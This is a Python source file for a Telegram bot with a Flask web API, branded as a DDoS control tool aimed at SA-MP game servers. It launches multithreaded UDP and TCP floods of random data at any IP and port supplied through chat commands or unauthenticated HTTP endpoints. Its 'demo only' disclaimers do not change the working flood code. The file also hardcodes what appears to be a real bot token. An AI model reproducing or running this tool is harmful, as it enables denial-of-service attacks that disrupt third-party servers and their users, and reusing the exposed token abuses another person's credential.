import random
import socket
import threading
import time
import os
import sys
import logging
from datetime import datetime
from flask import Flask, jsonify, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler
import warnings
warnings.filterwarnings('ignore')

# Disable logging for cleaner output
logging.basicConfig(level=logging.ERROR)

# Bot Token
BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"

# Flask app
app = Flask(__name__)

# Store active attacks
active_attacks = {}
attack_threads = {}
attack_stats = {}
stats_threads = {}

# Bot start time
BOT_START_TIME = time.time()

# Bot commands
START_TEXT = """
╔══════════════════════════════════╗
║  YORODA HAMADA DDOS BOT         ║
╠══════════════════════════════════╣
║  Bot Net Control Center          ║
║  SA-MP Attack Tool               ║
║  Demo/Presentation Mode          ║
╚══════════════════════════════════╝

Operator: YORODA HAMADA
Mode: DDOS (SA-MP)
Build: v1.0

Commands:
/start - Show this menu
/attack - Start DDOS attack
/stop - Stop all attacks
/status - Check attack status
/stats - Show live statistics
/help - Show help menu
"""

HELP_TEXT = """
HELP MENU

/attack - Start a new attack
   Usage: /attack [IP] [PORT] [PACKETS] [THREADS] [MODE]
   MODE: udp, tcp, both
   Example: /attack 192.168.1.1 7777 1000 500 udp
   Example: /attack 192.168.1.1 7777 1000 500 tcp
   Example: /attack 192.168.1.1 7777 1000 500 both

/stop - Stop all running attacks

/status - Check active attacks

/stats - Show live attack statistics

/help - Show this help menu

WARNING: This is for educational/demo purposes only!
"""

# Flask Routes
@app.route('/')
def index():
    """Main status page"""
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime = format_uptime(uptime_seconds)
    
    return jsonify({
        'status': 'online',
        'bot_name': 'YORODA HAMADA DDOS BOT',
        'operator': 'YORODA HAMADA',
        'uptime': uptime,
        'active_attacks': len(active_attacks),
        'total_attacks': len(active_attacks),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/status')
def status():
    """Get detailed status of all attacks"""
    attacks = []
    for attack_id, info in active_attacks.items():
        if info.get('running', False):
            attacks.append({
                'id': attack_id,
                'target': f"{info['ip']}:{info['port']}",
                'mode': info['mode'].upper(),
                'threads': info['threads'],
                'packets_sent': info.get('packets_sent', 0),
                'pps': info.get('pps', 0),
                'total_data_bytes': info.get('total_data', 0),
                'total_data_mb': round(info.get('total_data', 0) / (1024 * 1024), 2),
                'uptime': info.get('uptime', '0s'),
                'start_time': datetime.fromtimestamp(info.get('start_time', time.time())).isoformat()
            })
    
    return jsonify({
        'status': 'online',
        'active_attacks': len(attacks),
        'attacks': attacks,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/attack/<ip>/<int:port>/<int:threads>/<int:packets>/<mode>')
def api_start_attack(ip, port, threads, packets, mode):
    """Start attack via API"""
    if mode.lower() not in ['udp', 'tcp', 'both']:
        return jsonify({
            'error': 'Invalid mode. Use: udp, tcp, or both',
            'timestamp': datetime.now().isoformat()
        }), 400
    
    if packets < 100 or packets > 5000:
        return jsonify({
            'error': 'Packets must be between 100-5000',
            'timestamp': datetime.now().isoformat()
        }), 400
    
    if threads < 100 or threads > 5000:
        return jsonify({
            'error': 'Threads must be between 100-5000',
            'timestamp': datetime.now().isoformat()
        }), 400
    
    if port < 1 or port > 65535:
        return jsonify({
            'error': 'Invalid port number (1-65535)',
            'timestamp': datetime.now().isoformat()
        }), 400
    
    attack_id = f"{ip}:{port}:{mode.lower()}"
    
    if attack_id in active_attacks and active_attacks[attack_id].get('running', False):
        return jsonify({
            'error': f'Attack on {attack_id} is already running!',
            'timestamp': datetime.now().isoformat()
        }), 409
    
    # Start attack
    start_attack(ip, port, packets, threads, attack_id, mode.lower())
    
    return jsonify({
        'success': True,
        'message': f'Attack started on {ip}:{port} in {mode.upper()} mode',
        'attack_id': attack_id,
        'target': f"{ip}:{port}",
        'mode': mode.upper(),
        'threads': threads,
        'packets': packets,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/stop/<attack_id>')
def api_stop_attack(attack_id):
    """Stop specific attack via API"""
    if attack_id not in active_attacks:
        return jsonify({
            'error': 'Attack not found',
            'timestamp': datetime.now().isoformat()
        }), 404
    
    if attack_id in active_attacks:
        active_attacks[attack_id]['running'] = False
    
    return jsonify({
        'success': True,
        'message': f'Attack {attack_id} stopped',
        'attack_id': attack_id,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/stop/all')
def api_stop_all():
    """Stop all attacks via API"""
    stopped_count = 0
    for attack_id in list(active_attacks.keys()):
        if attack_id in active_attacks:
            active_attacks[attack_id]['running'] = False
            stopped_count += 1
    
    return jsonify({
        'success': True,
        'message': f'Stopped {stopped_count} attack(s)',
        'stopped_count': stopped_count,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/stats')
def api_stats():
    """Get attack statistics"""
    stats = {
        'total_attacks': len(active_attacks),
        'active_attacks': 0,
        'total_packets_sent': 0,
        'total_data_sent_bytes': 0,
        'total_data_sent_mb': 0,
        'attacks': []
    }
    
    for attack_id, info in active_attacks.items():
        if info.get('running', False):
            stats['active_attacks'] += 1
            stats['total_packets_sent'] += info.get('packets_sent', 0)
            stats['total_data_sent_bytes'] += info.get('total_data', 0)
            stats['attacks'].append({
                'id': attack_id,
                'target': f"{info['ip']}:{info['port']}",
                'mode': info['mode'].upper(),
                'packets_sent': info.get('packets_sent', 0),
                'pps': info.get('pps', 0)
            })
    
    stats['total_data_sent_mb'] = round(stats['total_data_sent_bytes'] / (1024 * 1024), 2)
    stats['timestamp'] = datetime.now().isoformat()
    
    return jsonify(stats)

def format_uptime(seconds):
    """Format uptime in human readable format"""
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        minutes = seconds // 60
        secs = seconds % 60
        return f"{minutes}m {secs}s"
    elif seconds < 86400:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours}h {minutes}m"
    else:
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        return f"{days}d {hours}h"

# Telegram Bot Functions
def start(update: Update, context: CallbackContext):
    """Send a message when /start is issued."""
    update.message.reply_text(START_TEXT)

def help_command(update: Update, context: CallbackContext):
    """Send a help message."""
    update.message.reply_text(HELP_TEXT)

def status_command(update: Update, context: CallbackContext):
    """Check status of active attacks."""
    if not active_attacks:
        update.message.reply_text("No active attacks running.")
        return
    
    status_msg = "ACTIVE ATTACKS:\n\n"
    has_attacks = False
    for attack_id, info in active_attacks.items():
        if info.get('running', False):
            has_attacks = True
            status_msg += f"ID: {attack_id}\n"
            status_msg += f"   Target: {info['ip']}:{info['port']}\n"
            status_msg += f"   Mode: {info['mode'].upper()}\n"
            status_msg += f"   Threads: {info['threads']}\n"
            status_msg += f"   Packets Sent: {info.get('packets_sent', 0):,}\n"
            status_msg += f"   Status: RUNNING\n\n"
    
    if has_attacks:
        update.message.reply_text(status_msg)
    else:
        update.message.reply_text("No active attacks running.")

def stats_command(update: Update, context: CallbackContext):
    """Show live attack statistics."""
    if not active_attacks:
        update.message.reply_text("No active attacks to show statistics.")
        return
    
    stats_msg = "LIVE ATTACK STATISTICS\n"
    stats_msg += "=" * 30 + "\n\n"
    has_attacks = False
    
    for attack_id, info in active_attacks.items():
        if info.get('running', False):
            has_attacks = True
            stats_msg += f"TARGET: {info['ip']}:{info['port']}\n"
            stats_msg += f"MODE: {info['mode'].upper()}\n"
            stats_msg += f"THREADS: {info['threads']}\n"
            stats_msg += f"PACKETS SENT: {info.get('packets_sent', 0):,}\n"
            stats_msg += f"PACKETS PER SECOND: {info.get('pps', 0):,}\n"
            stats_msg += f"TOTAL DATA SENT: {info.get('total_data', 0):,} bytes\n"
            stats_msg += f"TOTAL DATA (MB): {info.get('total_data', 0) / (1024 * 1024):.2f} MB\n"
            stats_msg += f"UPTIME: {info.get('uptime', '0s')}\n"
            stats_msg += "-" * 30 + "\n"
    
    if has_attacks:
        update.message.reply_text(stats_msg)
    else:
        update.message.reply_text("No active attacks to show statistics.")

def stop_command(update: Update, context: CallbackContext):
    """Stop all active attacks."""
    global active_attacks, attack_threads, attack_stats, stats_threads
    
    if not active_attacks:
        update.message.reply_text("No active attacks to stop.")
        return
    
    stopped_count = 0
    for attack_id in list(active_attacks.keys()):
        if attack_id in active_attacks:
            active_attacks[attack_id]['running'] = False
        
        if attack_id in attack_threads:
            for thread in attack_threads[attack_id]:
                pass
            del attack_threads[attack_id]
        
        if attack_id in attack_stats:
            del attack_stats[attack_id]
        
        if attack_id in stats_threads:
            del stats_threads[attack_id]
        
        del active_attacks[attack_id]
        stopped_count += 1
    
    update.message.reply_text(f"Stopped {stopped_count} attack(s).")

# UDP Attack functions
def attack_udp_1(ip, port, times, attack_id):
    """First UDP attack method with statistics"""
    data = random._urandom(998)
    
    while active_attacks.get(attack_id, {}).get('running', True):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                if not active_attacks.get(attack_id, {}).get('running', True):
                    break
                s.sendto(data, addr)
                if attack_id in active_attacks:
                    active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                    active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def attack_udp_2(ip, port, times, attack_id):
    """Second UDP attack method with statistics"""
    data = random._urandom(998)
    
    while active_attacks.get(attack_id, {}).get('running', True):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                if not active_attacks.get(attack_id, {}).get('running', True):
                    break
                s.sendto(data, addr)
                if attack_id in active_attacks:
                    active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                    active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

# TCP Attack functions
def attack_tcp_1(ip, port, times, attack_id):
    """First TCP attack method with statistics"""
    data = random._urandom(871)
    
    while active_attacks.get(attack_id, {}).get('running', True):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            for x in range(times):
                if not active_attacks.get(attack_id, {}).get('running', True):
                    break
                s.send(data)
                if attack_id in active_attacks:
                    active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                    active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
            s.close()
        except:
            try:
                s.close()
            except:
                pass

def attack_tcp_2(ip, port, times, attack_id):
    """Second TCP attack method with statistics"""
    data = random._urandom(871)
    
    while active_attacks.get(attack_id, {}).get('running', True):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            for x in range(times):
                if not active_attacks.get(attack_id, {}).get('running', True):
                    break
                s.send(data)
                if attack_id in active_attacks:
                    active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                    active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
            s.close()
        except:
            try:
                s.close()
            except:
                pass

def calculate_pps(attack_id):
    """Calculate packets per second for an attack"""
    last_packets = 0
    last_time = time.time()
    
    while active_attacks.get(attack_id, {}).get('running', False):
        current_time = time.time()
        current_packets = active_attacks[attack_id].get('packets_sent', 0)
        
        time_diff = current_time - last_time
        packets_diff = current_packets - last_packets
        
        if time_diff > 0 and attack_id in active_attacks:
            pps = packets_diff / time_diff
            active_attacks[attack_id]['pps'] = int(pps)
            
            start_time = active_attacks[attack_id].get('start_time', current_time)
            uptime_seconds = int(current_time - start_time)
            if uptime_seconds < 60:
                uptime = f"{uptime_seconds}s"
            elif uptime_seconds < 3600:
                uptime = f"{uptime_seconds // 60}m {uptime_seconds % 60}s"
            else:
                hours = uptime_seconds // 3600
                minutes = (uptime_seconds % 3600) // 60
                uptime = f"{hours}h {minutes}m"
            active_attacks[attack_id]['uptime'] = uptime
        
        last_packets = current_packets
        last_time = current_time
        time.sleep(1)

def start_stats_thread(attack_id):
    """Start the statistics calculation thread"""
    stats_thread = threading.Thread(target=calculate_pps, args=(attack_id,))
    stats_thread.daemon = True
    stats_thread.start()
    stats_threads[attack_id] = stats_thread

def start_attack(ip, port, times, threads, attack_id, mode):
    """Start the attack with multiple threads based on mode"""
    active_attacks[attack_id] = {
        'ip': ip,
        'port': port,
        'threads': threads,
        'times': times,
        'mode': mode,
        'running': True,
        'packets_sent': 0,
        'total_data': 0,
        'pps': 0,
        'uptime': '0s',
        'start_time': time.time()
    }
    
    attack_threads[attack_id] = []
    
    if mode == 'udp':
        threads_per_type = threads // 2
        if threads_per_type < 1:
            threads_per_type = 1
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_udp_1, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_udp_2, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
    
    elif mode == 'tcp':
        threads_per_type = threads // 2
        if threads_per_type < 1:
            threads_per_type = 1
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_tcp_1, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_tcp_2, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
    
    else:
        threads_per_type = threads // 4
        if threads_per_type < 1:
            threads_per_type = 1
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_udp_1, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_udp_2, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_tcp_1, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
        
        for _ in range(threads_per_type):
            t = threading.Thread(target=attack_tcp_2, args=(ip, port, times, attack_id))
            t.daemon = True
            t.start()
            attack_threads[attack_id].append(t)
    
    start_stats_thread(attack_id)

def attack_command(update: Update, context: CallbackContext):
    """Handle /attack command"""
    args = context.args
    
    if len(args) < 4:
        update.message.reply_text(
            "Invalid usage!\n\n"
            "Format: /attack [IP] [PORT] [PACKETS] [THREADS] [MODE]\n"
            "MODE: udp, tcp, both (default: both)\n"
            "Example: /attack 192.168.1.1 7777 1000 500 udp\n"
            "Example: /attack 192.168.1.1 7777 1000 500 tcp\n"
            "Example: /attack 192.168.1.1 7777 1000 500 both\n\n"
            "PACKETS: 100-5000\n"
            "THREADS: 100-5000"
        )
        return
    
    try:
        ip = args[0]
        port = int(args[1])
        times = int(args[2])
        threads = int(args[3])
        
        mode = 'both'
        if len(args) >= 5:
            mode = args[4].lower()
            if mode not in ['udp', 'tcp', 'both']:
                update.message.reply_text("Invalid mode! Choose: udp, tcp, or both")
                return
        
        if times < 100 or times > 5000:
            update.message.reply_text("Packets must be between 100-5000")
            return
        if threads < 100 or threads > 5000:
            update.message.reply_text("Threads must be between 100-5000")
            return
        if port < 1 or port > 65535:
            update.message.reply_text("Invalid port number (1-65535)")
            return
            
    except ValueError:
        update.message.reply_text("Invalid input! Please use numbers for port, packets, and threads.")
        return
    
    attack_id = f"{ip}:{port}:{mode}"
    
    if attack_id in active_attacks and active_attacks[attack_id].get('running', False):
        update.message.reply_text(f"Attack on {attack_id} is already running!")
        return
    
    confirm_msg = (
        f"Starting DDOS Attack\n\n"
        f"Target: {ip}\n"
        f"Port: {port}\n"
        f"Mode: {mode.upper()}\n"
        f"Packets: {times}\n"
        f"Threads: {threads}\n"
        f"Attack ID: {attack_id}\n\n"
        f"This is a demonstration only!"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("Confirm", callback_data=f"confirm_{attack_id}_{port}_{times}_{threads}_{mode}"),
            InlineKeyboardButton("Cancel", callback_data="cancel")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(confirm_msg, reply_markup=reply_markup)

def button_callback(update: Update, context: CallbackContext):
    """Handle button callbacks"""
    query = update.callback_query
    query.answer()
    
    data = query.data
    
    if data == "cancel":
        query.edit_message_text("Attack cancelled.")
        return
    
    if data.startswith("confirm_"):
        parts = data.split("_")
        if len(parts) >= 6:
            _, attack_id, port, times, threads, mode = parts
            ip = attack_id
            port = int(port)
            times = int(times)
            threads = int(threads)
            mode = mode.lower()
            attack_id = f"{ip}:{port}:{mode}"
        else:
            _, attack_id, port, times, threads = parts
            ip = attack_id
            port = int(port)
            times = int(times)
            threads = int(threads)
            mode = 'both'
            attack_id = f"{ip}:{port}:{mode}"
        
        query.edit_message_text(
            f"Attack Started!\n\n"
            f"Target: {ip}\n"
            f"Port: {port}\n"
            f"Mode: {mode.upper()}\n"
            f"Packets: {times}\n"
            f"Threads: {threads}\n"
            f"ID: {attack_id}\n\n"
            f"Use /stats to view live statistics\n"
            f"Use /status to check attack status"
        )
        
        start_attack(ip, port, times, threads, attack_id, mode)
        
        context.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"Attack on {attack_id} has been launched with {threads} threads in {mode.upper()} mode!"
        )

def error_handler(update, context):
    """Log errors caused by updates."""
    print(f"Update {update} caused error {context.error}")

def run_bot():
    """Run the Telegram bot"""
    try:
        # Create the Updater
        updater = Updater(token=BOT_TOKEN, use_context=True)
        dp = updater.dispatcher
        
        # Add command handlers
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("help", help_command))
        dp.add_handler(CommandHandler("status", status_command))
        dp.add_handler(CommandHandler("stats", stats_command))
        dp.add_handler(CommandHandler("stop", stop_command))
        dp.add_handler(CommandHandler("attack", attack_command))
        dp.add_handler(CallbackQueryHandler(button_callback))
        dp.add_error_handler(error_handler)
        
        # Start the bot
        print("Bot is polling for updates...")
        updater.start_polling()
        updater.idle()
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(5)

def run_flask():
    """Run Flask server"""
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)

def main():
    """Start the bot and Flask"""
    print("""
╔══════════════════════════════════╗
║  YORODA HAMADA TELEGRAM BOT     ║
║  DDOS Control Bot v1.0          ║
║  Operator: YORODA HAMADA        ║
╚══════════════════════════════════╝
    """)
    
    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    print(f"Flask server running on port {os.environ.get('PORT', 10000)}")
    
    # Run bot in main thread
    run_bot()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped.")
        sys.exit(0)
